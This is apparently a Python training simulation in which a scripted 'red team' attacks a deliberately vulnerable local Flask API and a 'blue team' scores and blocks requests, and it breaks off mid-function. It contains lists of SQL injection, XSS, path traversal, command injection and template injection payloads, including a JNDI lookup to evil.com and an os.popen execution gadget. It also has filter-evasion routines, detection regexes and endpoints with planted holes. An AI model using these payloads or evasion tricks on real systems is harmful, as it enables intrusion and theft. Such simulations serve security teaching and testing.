#!/usr/bin/env python3
"""
AI vs AI - Simulated API Warfare in Cyberspace (Local Version)
A cybersecurity simulation where Red Team AI attacks and Blue Team AI defends
No external API dependencies - runs completely locally
"""

import json
import time
import random
import logging
import re
import hashlib
from datetime import datetime, timedelta
from typing import Dict, List, Tuple, Optional, Set
from dataclasses import dataclass, asdict
from flask import Flask, request, jsonify
import threading
import requests
from queue import Queue

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('warfare_simulation.log'),
        logging.StreamHandler()
    ]
)

@dataclass
class AttackAttempt:
    """Represents a single attack attempt"""
    round_number: int
    timestamp: str
    endpoint: str
    method: str
    payload: str
    attack_type: str
    red_strategy: str
    blue_decision: str
    blue_reasoning: str
    blocked: bool
    success: bool
    red_score_delta: int
    blue_score_delta: int

@dataclass
class GameState:
    """Tracks the overall game state"""
    round_number: int = 0
    red_score: int = 0
    blue_score: int = 0
    total_attacks: int = 0
    blocked_attacks: int = 0
    successful_attacks: int = 0
    red_memory: List[str] = None
    blue_memory: List[str] = None

    def __post_init__(self):
        if self.red_memory is None:
            self.red_memory = []
        if self.blue_memory is None:
            self.blue_memory = []

class LocalAIEngine:
    """
    Local AI engine that simulates intelligent decision-making
    Uses rule-based systems, pattern matching, and evolutionary algorithms
    """

    def __init__(self):
        # Attack payload templates categorized by type
        self.attack_templates = {
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE {table}; --",
                "' UNION SELECT {columns} FROM {table}--",
                "admin'--",
                "' OR 1=1#",
                "1' AND '1'='1",
                "' OR 'a'='a",
                "1; DELETE FROM {table}--",
                "' UNION ALL SELECT NULL--",
                "1' OR SLEEP(5)--"
            ],
            'xss': [
                "<script>alert('{message}')</script>",
                "<img src=x onerror=alert('{message}')>",
                "javascript:alert('{message}')",
                "<svg onload=alert('{message}')>",
                "<iframe src=javascript:alert('{message}')>",
                "';alert('{message}');//",
                "<body onload=alert('{message}')>",
                "<ScRiPt>alert('{message}')</ScRiPt>",
                "<%2Fscript%3E%3Cscript%3Ealert('{message}')%3C%2Fscript%3E",
                "<script>eval('alert(\"{message}\")')</script>"  # Fixed: removed {encoded} placeholder
            ],
            'path_traversal': [
                "../../etc/passwd",
                "../../../windows/system32/config/sam",
                "....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/shadow",
                "../../usr/local/apache/conf/httpd.conf",
                "../../../etc/hosts",
                "....\\....\\....\\windows\\system.ini",
                "file:///etc/passwd"
            ],
            'auth_bypass': [
                "admin",
                "administrator",
                "root",
                "guest",
                "test",
                "demo",
                "user",
                "admin123",
                "password",
                "123456"
            ],
            'template_injection': [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "{{config}}",
                "${jndi:ldap://evil.com/x}",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                "<%= 7*7 %>",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "${{T(java.lang.Runtime).getRuntime().exec('calc')}}",
                "{{''[request.args.class][request.args.mro][2][request.args.subclasses]()}}"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "& dir",
                "; cat /etc/passwd",
                "|| id",
                "`whoami`",
                "$(id)",
                "; ping -c 1 127.0.0.1",
                "| net user",
                "; uname -a"
            ]
        }

        # Malicious pattern signatures for detection
        self.malicious_patterns = {
            'sql_injection': [
                r"(\bor\b|\bOR\b)\s+['\"]?1['\"]?\s*=\s*['\"]?1['\"]?",
                r"(\bunion\b|\bUNION\b)\s+(\ball\s+)?(\bselect\b|\bSELECT\b)",
                r"drop\s+table|DROP\s+TABLE",
                r"insert\s+into|INSERT\s+INTO",
                r"delete\s+from|DELETE\s+FROM",
                r"update\s+.*\s+set|UPDATE\s+.*\s+SET",
                r"['\"];?\s*--",
                r"['\"];?\s*#",
                r"sleep\s*\(|SLEEP\s*\(",
                r"benchmark\s*\(|BENCHMARK\s*\("
            ],
            'xss': [
                r"<script[^>]*>.*?</script>",
                r"javascript\s*:",
                r"on\w+\s*=",
                r"<iframe[^>]*>",
                r"<svg[^>]*onload",
                r"<img[^>]*onerror",
                r"<body[^>]*onload",
                r"alert\s*\(",
                r"document\.cookie",
                r"eval\s*\("
            ],
            'path_traversal': [
                r"\.\./",
                r"\.\.\\",
                r"%2e%2e%2f",
                r"\.\.%2f",
                r"\.\.%5c",
                r"/etc/passwd",
                r"/etc/shadow",
                r"windows\\system32",
                r"config/sam",
                r"file:///"
            ],
            'template_injection': [
                r"\{\{.*?\}\}",
                r"\$\{.*?\}",
                r"#\{.*?\}",
                r"<%= .* %>",
                r"jndi:",
                r"__class__",
                r"__mro__",
                r"__subclasses__",
                r"__globals__",
                r"Runtime\.getRuntime"
            ],
            'command_injection': [
                r"[;&|`]\s*\w+",
                r"\$\(.*?\)",
                r"`.*?`",
                r"whoami",
                r"\bls\b|\bdir\b",
                r"\bcat\b|\btype\b",
                r"\bping\b",
                r"\bid\b",
                r"uname\s+-a",
                r"net\s+user"
            ]
        }

        # Context-aware endpoint vulnerabilities
        self.endpoint_vulnerabilities = {
            '/login': ['sql_injection', 'auth_bypass'],
            '/query': ['sql_injection', 'xss'],
            '/upload': ['path_traversal', 'command_injection'],
            '/profile': ['sql_injection', 'xss', 'path_traversal']
        }

        # Evasion techniques
        self.evasion_techniques = [
            'case_variation',
            'encoding',
            'comment_insertion',
            'whitespace_manipulation',
            'concatenation'
        ]

        # Learning weights (simulates AI learning)
        self.red_team_weights = {
            'sql_injection': 1.0,
            'xss': 1.0,
            'path_traversal': 1.0,
            'auth_bypass': 1.0,
            'template_injection': 1.0,
            'command_injection': 1.0
        }

        self.blue_team_sensitivity = {
            'sql_injection': 0.8,
            'xss': 0.85,
            'path_traversal': 0.9,
            'template_injection': 0.75,
            'command_injection': 0.8
        }

    def apply_evasion(self, payload: str, technique: str) -> str:
        """Apply evasion techniques to bypass detection"""
        if technique == 'case_variation':
            # Randomly vary case
            result = ""
            for char in payload:
                if char.isalpha():
                    result += char.upper() if random.random() < 0.3 else char.lower()
                else:
                    result += char
            return result

        elif technique == 'encoding':
            # URL encoding
            encoded_chars = []
            for char in payload:
                if random.random() < 0.2 and char in "' \"<>=&;":
                    encoded_chars.append(f"%{ord(char):02x}")
                else:
                    encoded_chars.append(char)
            return ''.join(encoded_chars)

        elif technique == 'comment_insertion':
            # Insert SQL comments
            if 'OR' in payload.upper():
                return payload.replace('OR', '/**/OR/**/')
            if 'UNION' in payload.upper():
                return payload.replace('UNION', 'UNION/**/ALL/**/')
            return payload

        elif technique == 'whitespace_manipulation':
            # Add extra whitespace or tabs
            return re.sub(r'\s+', lambda m: m.group(0) + '\t' if random.random() < 0.3 else m.group(0), payload)

        elif technique == 'concatenation':
            # String concatenation to break signatures
            if "alert" in payload:
                return payload.replace("alert", "ale"+"rt")
            if "script" in payload:
                return payload.replace("script", "scr"+"ipt")
            return payload

        return payload

    def calculate_payload_complexity(self, payload: str) -> float:
        """Calculate complexity score of a payload"""
        complexity = 0

        # Length factor
        complexity += len(payload) * 0.1

        # Special characters
        special_chars = sum(1 for c in payload if c in "';\"<>&=()[]{}|`$#")
        complexity += special_chars * 0.5

        # Encoding detection
        if '%' in payload:
            complexity += 2

        # Multiple attack types
        attack_types = 0
        for patterns in self.malicious_patterns.values():
            if any(re.search(pattern, payload, re.IGNORECASE) for pattern in patterns):
                attack_types += 1
        complexity += attack_types * 1.5

        return complexity

    def generate_contextual_payload(self, endpoint: str, attack_type: str,
                                  previous_failures: List[str],
                                  blue_team_memory: List[str]) -> str:
        """Generate context-aware payload"""
        templates = self.attack_templates.get(attack_type, ['generic_payload'])
        base_payload = random.choice(templates)

        # Apply endpoint-specific context with safer formatting
        try:
            if endpoint == '/login':
                if attack_type == 'sql_injection':
                    if '{table}' in base_payload:
                        base_payload = base_payload.replace('{table}', 'users')
                    if '{columns}' in base_payload:
                        base_payload = base_payload.replace('{columns}', 'username,password')
                    if '{message}' in base_payload:
                        base_payload = base_payload.replace('{message}', 'login')
                elif attack_type == 'auth_bypass':
                    return random.choice(['admin', 'administrator', "admin' OR '1'='1"])

            elif endpoint == '/query':
                if '{table}' in base_payload:
                    base_payload = base_payload.replace('{table}', 'products')
                if '{columns}' in base_payload:
                    base_payload = base_payload.replace('{columns}', 'id,name,price')
                if '{message}' in base_payload:
                    base_payload = base_payload.replace('{message}', 'search')

            elif endpoint == '/upload':
                if attack_type == 'path_traversal':
                    return random.choice([
                        "../../etc/passwd",
                        "../../../windows/system32/config/sam",
                        "....//....//etc/shadow"
                    ])

            elif endpoint == '/profile':
                if '{table}' in base_payload:
                    base_payload = base_payload.replace('{table}', 'profiles')
                if '{columns}' in base_payload:
                    base_payload = base_payload.replace('{columns}', 'id,username,email')
                if '{message}' in base_payload:
                    base_payload = base_payload.replace('{message}', 'profile')

        except Exception as e:
            # If formatting fails, use a simple fallback
            logging.warning(f"Payload formatting failed: {e}")
            fallback_payloads = {
                'sql_injection': "' OR '1'='1",
                'xss': "<script>alert('test')</script>",
                'path_traversal': "../../etc/passwd",
                'auth_bypass': "admin",
                'template_injection': "{{7*7}}",
                'command_injection': "; whoami"
            }
            base_payload = fallback_payloads.get(attack_type, 'test')

        # Learn from previous failures
        if previous_failures:
            recent_failures = previous_failures[-3:]
            for failure in recent_failures:
                # If simple quotes were blocked, try double quotes
                if "'" in failure and "blocked" in str(blue_team_memory):
                    base_payload = base_payload.replace("'", '"')
                # If script tags were blocked, try other XSS vectors
                if "<script>" in failure:
                    base_payload = base_payload.replace("<script>", "<img src=x onerror=")

        # Apply evasion techniques randomly
        if random.random() < 0.4:
            technique = random.choice(self.evasion_techniques)
            base_payload = self.apply_evasion(base_payload, technique)

        return base_payload

    def analyze_threat_level(self, payload: str, endpoint: str,
                           attack_history: List[str]) -> Tuple[float, Dict[str, float], str]:
        """Analyze threat level using pattern matching and context"""
        threat_scores = {}
        max_score = 0
        primary_threat = "unknown"

        # Check each attack type
        for attack_type, patterns in self.malicious_patterns.items():
            score = 0

            # Pattern matching
            for pattern in patterns:
                if re.search(pattern, payload, re.IGNORECASE):
                    score += 1

            # Normalize score
            score = min(score / len(patterns), 1.0)

            # Apply context sensitivity
            if endpoint in self.endpoint_vulnerabilities:
                if attack_type in self.endpoint_vulnerabilities[endpoint]:
                    score *= 1.5  # Boost score for endpoint-relevant attacks

            # Apply blue team sensitivity (learning)
            score *= self.blue_team_sensitivity.get(attack_type, 1.0)

            threat_scores[attack_type] = score

            if score > max_score:
                max_score = score
                primary_threat = attack_type

        # Historical context
        if attack_history:
            recent_attacks = attack_history[-5:]
            for recent in recent_attacks:
                # If similar attacks were seen recently, increase suspicion
                similarity = self.calculate_similarity(payload, recent)
                if similarity > 0.7:
                    max_score *= 1.2

        # Complexity factor
        complexity = self.calculate_payload_complexity(payload)
        if complexity > 10:
            max_score *= 1.1

        return max_score, threat_scores, primary_threat

    def calculate_similarity(self, payload1: str, payload2: str) -> float:
        """Calculate similarity between two payloads"""
        # Simple Jaccard similarity
        set1 = set(payload1.lower().split())
        set2 = set(payload2.lower().split())

        if not set1 and not set2:
            return 1.0

        intersection = len(set1.intersection(set2))
        union = len(set1.union(set2))

        return intersection / union if union > 0 else 0.0

    def evolve_strategies(self, red_success_rate: float, blue_success_rate: float):
        """Evolve AI strategies based on performance"""
        # Red team evolution
        if red_success_rate < 0.3:
            # Increase weight for successful attack types
            for attack_type in self.red_team_weights:
                if random.random() < 0.3:
                    self.red_team_weights[attack_type] *= 1.1

        # Blue team evolution
        if blue_success_rate < 0.7:
            # Increase sensitivity
            for attack_type in self.blue_team_sensitivity:
                if random.random() < 0.2:
                    self.blue_team_sensitivity[attack_type] = min(
                        self.blue_team_sensitivity[attack_type] * 1.05, 1.0
                    )

class VulnerableAPI:
    """Flask API with intentionally vulnerable endpoints for testing"""

    def __init__(self, port=5000):
        self.app = Flask(__name__)
        self.port = port
        self.request_queue = Queue()
        self.setup_routes()

    def setup_routes(self):

        @self.app.route('/login', methods=['POST'])
        def login():
            username = request.json.get('username', '') if request.json else ''
            password = request.json.get('password', '') if request.json else ''

            # Log the request for analysis
            self.request_queue.put({
                'endpoint': '/login',
                'method': 'POST',
                'data': {'username': username, 'password': password}
            })

            # Simulate vulnerable authentication
            if "admin" in username.lower() or "OR" in username.upper():
                return jsonify({"status": "success", "token": "admin_token_123", "user": "admin"})
            return jsonify({"status": "failed", "message": "Invalid credentials"})

        @self.app.route('/query', methods=['GET'])
        def query():
            search = request.args.get('q', '')

            self.request_queue.put({
                'endpoint': '/query',
                'method': 'GET',
                'data': {'q': search}
            })

            # Simulate SQL injection vulnerability
            results = []
            if "UNION" in search.upper():
                results = ["admin:admin123", "user:password", "guest:guest"]
            elif "DROP" in search.upper():
                results = ["Table dropped successfully"]
            else:
                results = [f"Product matching: {search}"]

            return jsonify({
                "results": results,
                "query": f"SELECT * FROM products WHERE name LIKE '%{search}%'"
            })

        @self.app.route('/upload', methods=['POST'])
        def upload():
            filename = request.json.get('filename', '') if request.json else ''
            content = request.json.get('content', '') if request.json else ''

            self.request_queue.put({
                'endpoint': '/upload',
                'method': 'POST',
                'data': {'filename': filename, 'content': content}
            })

            # Simulate path traversal vulnerability
            if ".." in filename:
                return jsonify({
                    "status": "error",
                    "message": f"File contents: root:x:0:0:root:/root:/bin/bash",
                    "filename": filename
                })

            return jsonify({"status": "uploaded", "filename": filename})

        @self.app.route('/profile', methods=['GET'])
        def profile():
            user_id = request.args.get('id', '1')

            self.request_queue.put({
                'endpoint': '/profile',
                'method': 'GET',
                'data': {'id': user_id}
            })

            # Simulate various vulnerabilities
            response_data = {"user_id": user_id}

            if "'" in user_id or "UNION" in user_id.upper():
                response_data["sensitive_data"] = "admin:password123:admin@example.com"
            elif "<script>" in user_id:
                response_data["profile"] = f"<script>alert('XSS')</script>Profile for {user_id}"
            else:
                response_data["profile"] = f"User profile for ID: {user_id}"

            return jsonify(response_data)

    def start_server(self):
        """Start the Flask server in a separate thread"""
        def run():
            self.app.run(host='127.0.0.1', port=self.port, debug=False)

        server_thread = threading.Thread(target=run, daemon=True)
        server_thread.start()
        time.sleep(2)  # Give server time to start
        return server_thread

class RedTeamAI:
    """AI-driven attacker that generates malicious payloads"""

    def __init__(self, ai_engine: LocalAIEngine):
        self.ai_engine = ai_engine
        self.memory = []
        self.successful_attacks = []
        self.failed_attacks = []
        self.strategy_weights = {
            'sql_injection': 1.0,
            'xss': 1.0,
            'path_traversal': 1.0,
            'auth_bypass': 1.0,
            'template_injection': 1.0,
            'command_injection': 1.0
        }
        self.learning_rate = 0.1

    def select_attack_type(self, endpoint: str) -> str:
        """Intelligently select attack type based on endpoint and success history"""
        # Get relevant attack types for endpoint
        relevant_types = self.ai_engine.endpoint_vulnerabilities.get(endpoint,
                                                                   list(self.strategy_weights.keys()))

        # Weight by success history
        weighted_types = []
        for attack_type in relevant_types:
            weight = self.strategy_weights.get(attack_type, 1.0)
            # Add some randomness for exploration
            weight *= (0.8 + random.random() * 0.4)
            weighted_types.extend([attack_type] * int(weight * 10))

        return random.choice(weighted_types) if weighted_types else random.choice(relevant_types)

    def generate_attack(self, game_state: GameState) -> Dict:
        """Generate a new attack based on current game state and memory"""

        endpoints = ['/login', '/query', '/upload', '/profile']
        methods = ['POST', 'GET', 'POST', 'GET']

        endpoint_idx = random.randint(0, len(endpoints) - 1)
        endpoint = endpoints[endpoint_idx]
        method = methods[endpoint_idx]

        # Select attack type intelligently
        attack_type = self.select_attack_type(endpoint)

        # Generate contextual payload
        payload = self.ai_engine.generate_contextual_payload(
            endpoint, attack_type, self.failed_attacks, game_state.blue_memory
        )

        # Generate strategy description
        strategy = self.generate_strategy_description(endpoint, attack_type, payload)

        attack = {
            'endpoint': endpoint,
            'method': method,
            'payload': payload,
            'attack_type': attack_type,
            'strategy': strategy
        }

        # Update memory
        memory_entry = f"Round {game_state.round_number}: {strategy}"
        self.memory.append(memory_entry)
        if len(self.memory) > 10:
            self.memory.pop(0)  # Keep only recent memory

        return attack

    def generate_strategy_description(self, endpoint: str, attack_type: str, payload: str) -> str:
        """Generate human-readable strategy description"""
        base_strategies = {
            'sql_injection': f"Attempting SQL injection on {endpoint} to bypass authentication or extract data",
            'xss': f"Testing for XSS vulnerability on {endpoint} to execute malicious scripts",
            'path_traversal': f"Trying path traversal on {endpoint} to access sensitive files",
            'auth_bypass': f"Attempting to bypass authentication on {endpoint}",
            'template_injection': f"Testing template injection on {endpoint} for code execution",
            'command_injection': f"Attempting command injection on {endpoint} for system access"
        }

        strategy = base_strategies.get(attack_type, f"Testing {attack_type} on {endpoint}")

        # Add complexity analysis
        complexity = self.ai_engine.calculate_payload_complexity(payload)
        if complexity > 15:
            strategy += " (using advanced evasion techniques)"
        elif complexity > 10:
            strategy += " (with moderate obfuscation)"

        return strategy

    def learn_from_result(self, attack: Dict, blocked: bool, success: bool):
        """Learn from the result of an attack"""
        attack_type = attack['attack_type']

        if success:
            self.successful_attacks.append(attack['payload'])
            # Increase weight for successful attack type
            self.strategy_weights[attack_type] = min(
                self.strategy_weights[attack_type] * (1 + self.learning_rate), 2.0
            )
        else:
            self.failed_attacks.append(attack['payload'])
            if blocked:
                # Slightly decrease weight for blocked attack type
                self.strategy_weights[attack_type] = max(
                    self.strategy_weights[attack_type] * (1 - self.learning_rate/2), 0.5
                )

        # Keep only recent attacks in memory
        if len(self.successful_attacks) > 5:
            self.successful_attacks.pop(0)
        if len(self.failed_attacks) > 10:
            self.failed_attacks.pop(0)

class BlueTeamAI:
    """AI-driven defender that analyzes and blocks malicious requests"""

    def __init__(self, ai_engine: LocalAIEngine):
        self.ai_engine = ai_engine
        self.memory = []
        self.known_attacks = []
        self.false_positives = []
        self.block_threshold = 0.6
        self.learning_rate = 0.05

    def analyze_request(self, attack: Dict, game_state: GameState) -> Tuple[bool, str]:
        """Analyze incoming request and decide whether to block it"""

        payload = attack['payload']
        endpoint = attack['endpoint']

        # Use AI engine to analyze threat
        threat_score, threat_breakdown, primary_threat = self.ai_engine.analyze_threat_level(
            payload, endpoint, self.known_attacks
        )

        # Decision logic
        should_block = threat_score >= self.block_threshold

        # Generate reasoning
        reasoning = self.generate_reasoning(
            payload, endpoint, threat_score, threat_breakdown, primary_threat, should_block
        )

        # Add memory-based adjustments
        if self.memory:
            similar_attacks = [m for m in self.memory if self.ai_engine.calculate_similarity(payload, m) > 0.6]
            if similar_attacks:
                should_block = True
                reasoning += f" (Similar to {len(similar_attacks)} previous attacks)"

        # Update memory
        memory_entry = f"Round {game_state.round_number}: {primary_threat} - {payload[:50]}..."
        self.memory.append(memory_entry)
        if len(self.memory) > 15:
            self.memory.pop(0)

        return should_block, reasoning

    def generate_reasoning(self, payload: str, endpoint: str, threat_score: float,
                         threat_breakdown: Dict[str, float], primary_threat: str,
                         should_block: bool) -> str:
        """Generate human-readable reasoning for the decision"""

        if should_block:
            reasoning = f"BLOCKING: Detected {primary_threat} attack (confidence: {threat_score:.2f})"

            # Add specific patterns found
            high_scores = [(k, v) for k, v in threat_breakdown.items() if v > 0.3]
            if high_scores:
                patterns = [k.replace('_', ' ') for k, _ in high_scores[:2]]
                reasoning += f". Patterns: {', '.join(patterns)}"

            # Add context
            if endpoint in ['/login', '/profile'] and 'sql' in primary_threat:
                reasoning += ". Critical endpoint - authentication bypass risk"
            elif endpoint == '/upload' and 'path' in primary_threat:
                reasoning += ". File upload endpoint - directory traversal risk"

        else:
            reasoning = f"ALLOWING: Low threat score ({threat_score:.2f})"
            if threat_score > 0.2:
                reasoning += f", some {primary_threat} indicators but below threshold"
            else:
                reasoning += ", no significant malicious patterns detected"

        return reasoning

    def learn_from_result(self, attack: Dict, blocked: bool, actual_success: bool):
        """Learn from the result of the defense decision"""
        payload = attack['payload']

        if blocked and not actual_success:
            # Correct block - reinforce decision
            self.known_attacks.append(payload)
        elif not blocked and actual_success:
            # Missed attack - learn from it and lower threshold
            self.known_attacks.append(payload)
            self.block_threshold = max(self.block_threshold - self.learning_rate, 0.3)
        elif blocked and not actual_success:
            # Possible false positive - raise threshold slightly
            self.false_positives.append(payload)
            self.block_threshold = min(self.block_threshold + self.learning_rate/2, 0.9)

        # Keep memory manageable
        if len(self.known_attacks) > 20:
            self.known_attacks.pop(0)
        if len(self.false_positives) > 10:
            self.false_positives.pop(0)

class WarfareSimulation:
    """Main simulation engine that orchestrates the AI warfare"""

    def __init__(self, max_rounds=50):
        self.max_rounds = max_rounds
        self.game_state = GameState()
        self.api_server = VulnerableAPI()
        self.ai_engine = LocalAIEngine()
        self.red_team = RedTeamAI(self.ai_engine)
        self.blue_team = BlueTeamAI(self.ai_engine)
        self.attack_log = []

    def execute_attack(self, attack: Dict) -> bool:
        """Execute an attack against the API and determine if it was successful"""

        try:
            endpoint = attack['endpoint']
            method = attack['method']
            payload = attack['payload']

            url = f"http://127.0.0.1:5000{endpoint}"

            if method == 'POST':
                if endpoint == '/login':
                    response = requests.post(url, json={
                        'username': payload,
                        'password': 'test'
                    }, timeout=5)
                elif endpoint == '/upload':
                    response = requests.post(url, json={
                        'filename': payload,
                        'content': 'test content'
                    }, timeout=5)
            else:  # GET
                if endpoint == '/query':
                    response = requests.get(url, params={'q': payload}, timeout=5)
                elif endpoint == '/profile':
                    response = requests.get(url, params={'id': payload}, timeout=5)

            # Determine success based on response content
            if response.status_code == 200:
                response_text = response.text.lower()
                response_json = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}

                # Check for signs of successful exploitation
                success_indicators = [
                    'admin_token', 'admin:password', 'root:x:', 'sensitive_data',
                    'table dropped', 'admin:admin123', '<script>', 'alert',
                    'user:password', 'guest:guest'
                ]

                # Check response text
                text_success = any(indicator in response_text for indicator in success_indicators)

                # Check for specific success patterns in JSON
                json_success = False
                if response_json:
                    if 'token' in response_json or 'sensitive_data' in response_json:
                        json_success = True
                    if 'results' in response_json and isinstance(response_json['results'], list):
                        results_text = str(response_json['results']).lower()
                        json_success = any(indicator in results_text for indicator in success_indicators)

                return text_success or json_success

            return False

        except Exception as e:
            logging.error(f"Attack execution failed: {e}")
            return False

    def run_round(self) -> AttackAttempt:
        """Execute a single round of the simulation"""

        self.game_state.round_number += 1
        logging.info(f"\n=== ROUND {self.game_state.round_number} ===")

        # Red Team generates attack
        attack = self.red_team.generate_attack(self.game_state)
        logging.info(f"🔴 RED TEAM: {attack['strategy']}")
        logging.info(f"   Target: {attack['method']} {attack['endpoint']}")
        logging.info(f"   Payload: {attack['payload']}")
        logging.info(f"   Attack Type: {attack['attack_type']}")

        # Blue Team analyzes attack
        should_block, blue_reasoning = self.blue_team.analyze_request(
            attack, self.game_state
        )

        blue_decision = "BLOCK" if should_block else "ALLOW"
        logging.info(f"🔵 BLUE TEAM: {blue_decision}")
        logging.info(f"   Reasoning: {blue_reasoning}")

        # Execute attack if not blocked
        attack_successful = False
        if not should_block:
            attack_successful = self.execute_attack(attack)
            self.game_state.total_attacks += 1
        else:
            self.game_state.blocked_attacks += 1

        # Score calculation
        red_score_delta = 0
        blue_score_delta = 0

        if should_block and not attack_successful:
            # Correct block
            blue_score_delta = 10
            logging.info("✅ Blue Team successfully blocked malicious attack!")
        elif not should_block and attack_successful:
            # Successful attack
            red_score_delta = 15
            self.game_state.successful_attacks += 1
            logging.info("💥 Red Team attack succeeded!")
        elif not should_block and not attack_successful:
            # Benign allow (attack failed naturally)
            blue_score_delta = 2
            logging.info("✅ Blue Team correctly allowed request (attack failed naturally)")
        else:
            # False positive block
            red_score_delta = 5
            logging.info("⚠️  Blue Team false positive - blocked benign request")

        # Update scores
        self.game_state.red_score += red_score_delta
        self.game_state.blue_score += blue_score_delta

        # Create attack attempt record
        attempt = AttackAttempt(
            round_number=self.game_state.round_number,
            timestamp=datetime.now().isoformat(),
            endpoint=attack['endpoint'],
            method=attack['method'],
            payload=attack['payload'],
            attack_type=attack['attack_type'],
            red_strategy=attack['strategy'],
            blue_decision=blue_decision,
            blue_reasoning=blue_reasoning,
            blocked=should_block,
            success=attack_successful,
            red_score_delta=red_score_delta,
            blue_score_delta=blue_score_delta
        )

        # Let both teams learn from the result
        self.red_team.learn_from_result(attack, should_block, attack_successful)
        self.blue_team.learn_from_result(attack, should_block, attack_successful)

        # Update team memories in game state
        self.game_state.red_memory = self.red_team.memory.copy()
        self.game_state.blue_memory = self.blue_team.memory.copy()

        # Evolve AI strategies periodically
        if self.game_state.round_number % 10 == 0:
            red_success_rate = self.game_state.successful_attacks / max(self.game_state.total_attacks, 1)
            blue_success_rate = (self.game_state.blocked_attacks + (self.game_state.total_attacks - self.game_state.successful_attacks)) / max(self.game_state.round_number, 1)
            self.ai_engine.evolve_strategies(red_success_rate, blue_success_rate)
            logging.info(f"🧠 AI strategies evolved - Red success rate: {red_success_rate:.2f}, Blue success rate: {blue_success_rate:.2f}")

        self.attack_log.append(attempt)

        # Display current scores
        logging.info(f"📊 Scores - Red: {self.game_state.red_score} | Blue: {self.game_state.blue_score}")

        return attempt

    def run_simulation(self):
        """Run the complete simulation"""

        logging.info("🚀 Starting AI vs AI Cybersecurity Warfare Simulation (Local Mode)")
        logging.info("🤖 Using Local AI Engine - No external dependencies!")
        logging.info("=" * 70)

        # Start the vulnerable API server
        logging.info("Starting vulnerable API server...")
        self.api_server.start_server()

        try:
            # Run simulation rounds
            for round_num in range(1, self.max_rounds + 1):
                attempt = self.run_round()
                time.sleep(0.5)  # Brief pause between rounds

                # Periodic status updates
                if round_num % 10 == 0:
                    self.print_status_report()

            # Final results
            self.print_final_results()

        except KeyboardInterrupt:
            logging.info("\nSimulation interrupted by user")
            self.print_final_results()
        except Exception as e:
            logging.error(f"Simulation error: {e}")
            self.print_final_results()

    def print_status_report(self):
        """Print intermediate status report"""
        logging.info("\n" + "="*60)
        logging.info("📊 STATUS REPORT")
        logging.info(f"Rounds completed: {self.game_state.round_number}")
        logging.info(f"Red Team score: {self.game_state.red_score}")
        logging.info(f"Blue Team score: {self.game_state.blue_score}")
        logging.info(f"Total attacks: {self.game_state.total_attacks}")
        logging.info(f"Blocked attacks: {self.game_state.blocked_attacks}")
        logging.info(f"Successful attacks: {self.game_state.successful_attacks}")

        if self.game_state.total_attacks > 0:
            block_rate = (self.game_state.blocked_attacks / self.game_state.round_number) * 100
            success_rate = (self.game_state.successful_attacks / self.game_state.total_attacks) * 100
            logging.info(f"Block rate: {block_rate:.1f}%")
            logging.info(f"Attack success rate: {success_rate:.1f}%")

        # Show AI learning stats
        logging.info(f"🧠 Red Team Strategy Weights: {dict(list(self.red_team.strategy_weights.items())[:3])}")
        logging.info(f"🛡️  Blue Team Block Threshold: {self.blue_team.block_threshold:.2f}")

        logging.info("="*60 + "\n")

    def print_final_results(self):
        """Print final simulation results"""
        logging.info("\n" + "🏆" + "="*68 + "🏆")
        logging.info("                         FINAL RESULTS")
        logging.info("🏆" + "="*68 + "🏆")

        # Determine winner
        if self.game_state.red_score > self.game_state.blue_score:
            winner = "🔴 RED TEAM (Attackers)"
            margin = self.game_state.red_score - self.game_state.blue_score
        elif self.game_state.blue_score > self.game_state.red_score:
            winner = "🔵 BLUE TEAM (Defenders)"
            margin = self.game_state.blue_score - self.game_state.red_score
        else:
            winner = "🤝 TIE GAME"
            margin = 0

        logging.info(f"Winner: {winner}")
        if margin > 0:
            logging.info(f"Victory margin: {margin} points")

        logging.info(f"\nFinal Scores:")
        logging.info(f"🔴 Red Team: {self.game_state.red_score}")
        logging.info(f"🔵 Blue Team: {self.game_state.blue_score}")

        logging.info(f"\nBattle Statistics:")
        logging.info(f"Total rounds: {self.game_state.round_number}")
        logging.info(f"Total attacks attempted: {self.game_state.total_attacks}")
        logging.info(f"Attacks blocked: {self.game_state.blocked_attacks}")
        logging.info(f"Successful attacks: {self.game_state.successful_attacks}")

        if self.game_state.round_number > 0:
            block_rate = (self.game_state.blocked_attacks / self.game_state.round_number) * 100
            logging.info(f"Overall block rate: {block_rate:.1f}%")

        if self.game_state.total_attacks > 0:
            success_rate = (self.game_state.successful_attacks / self.game_state.total_attacks) * 100
            logging.info(f"Attack success rate: {success_rate:.1f}%")

        # AI Evolution Stats
        logging.info(f"\n🧠 AI Learning Results:")
        logging.info(f"Red Team final strategy weights:")
        for attack_type, weight in self.red_team.strategy_weights.items():
            logging.info(f"   {attack_type}: {weight:.2f}")

        logging.info(f"Blue Team final sensitivity:")
        for attack_type, sensitivity in self.ai_engine.blue_team_sensitivity.items():
            logging.info(f"   {attack_type}: {sensitivity:.2f}")

        logging.info(f"Blue Team final block threshold: {self.blue_team.block_threshold:.2f}")

        # Attack Type Analysis
        attack_type_stats = {}
        for attempt in self.attack_log:
            attack_type = attempt.attack_type
            if attack_type not in attack_type_stats:
                attack_type_stats[attack_type] = {'total': 0, 'successful': 0, 'blocked': 0}

            attack_type_stats[attack_type]['total'] += 1
            if attempt.success:
                attack_type_stats[attack_type]['successful'] += 1
            if attempt.blocked:
                attack_type_stats[attack_type]['blocked'] += 1

        logging.info(f"\n📈 Attack Type Analysis:")
        for attack_type, stats in attack_type_stats.items():
            success_rate = (stats['successful'] / stats['total']) * 100 if stats['total'] > 0 else 0
            block_rate = (stats['blocked'] / stats['total']) * 100 if stats['total'] > 0 else 0
            logging.info(f"   {attack_type}: {stats['total']} attempts, {success_rate:.1f}% success, {block_rate:.1f}% blocked")

        # Save detailed log
        self.save_detailed_log()

        logging.info("="*70)

    def save_detailed_log(self):
        """Save detailed log of all attacks to JSON file"""
        # Calculate additional stats
        attack_type_stats = {}
        endpoint_stats = {}

        for attempt in self.attack_log:
            # Attack type stats
            attack_type = attempt.attack_type
            if attack_type not in attack_type_stats:
